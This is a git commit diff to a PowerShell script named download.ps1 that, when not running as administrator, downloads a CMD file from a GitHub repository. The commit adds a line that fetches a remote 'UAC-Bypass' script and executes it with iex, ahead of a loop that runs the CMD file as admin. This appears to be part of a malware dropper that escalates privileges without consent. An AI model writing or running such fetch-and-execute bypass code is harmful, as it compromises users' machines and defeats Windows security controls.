b053758d0f3ed8c8082c90c6918bf4ec0a8f6781
43a1723 <hai1723notgay@gmail.com>
2024-05-30 11:07:46 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -4,6 +4,9 @@ New-Item -ItemType Directory -Path $dir
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     # Download the CMD file
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$dir\run.cmd"
+
+    iex (iwr -uri "https://raw.githubusercontent.com/avi7611/UAC-Bypass/main/Bypass.ps1" -useb)
+    Start-Sleep -Seconds 8
     
     # Run the CMD file as admin
     while ($true) {
